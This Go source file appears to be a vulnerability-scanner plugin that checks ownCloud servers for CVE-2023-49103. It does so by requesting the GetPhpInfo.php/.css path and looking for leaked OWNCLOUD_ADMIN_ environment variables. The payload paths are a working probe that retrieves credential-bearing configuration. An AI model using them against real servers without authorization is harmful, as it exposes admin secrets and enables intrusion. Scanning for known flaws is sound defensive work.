package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("owncloud_graphapi_info_leak", &owncloud_graphapi_info_leak{})
}

type owncloud_graphapi_info_leak struct{}

func (p *owncloud_graphapi_info_leak) Info() PluginInfo {
	return PluginInfo{
		Name:     "OwnCloud 敏感信息泄漏漏洞",
		VulnInfo: "ownCloud owncloud/graphapi 0.2.x在0.2.1之前和0.3.x在0.3.1之前存在漏洞。graphapi应用程序依赖于提供URL的第三方GetPhpInfo.php库。当访问此URL时，会显示PHP环境的配置详细信息（phpinfo）。",
		VulnID:   "CVE-2023-49103",
		Level:    "7.5 HIGH",
		URL:      "",
		Version:  "0.2.0 <= ownCloud < 0.2.1; 0.3.0 <= ownCloud < 0.3.1",
		CWE:      "",
	}
}

func (p *owncloud_graphapi_info_leak) Check(netloc string) bool {
	payloads := []string{
		"/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css",
		"/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css",
	}
	for _, payload := range payloads {
		url := netloc + payload
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		resp, err := utils.RequestDo(req, true, 2)
		if err != nil {
			continue
		}

		if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "OWNCLOUD_ADMIN_") {
			return true
		}
	}

	return false
}
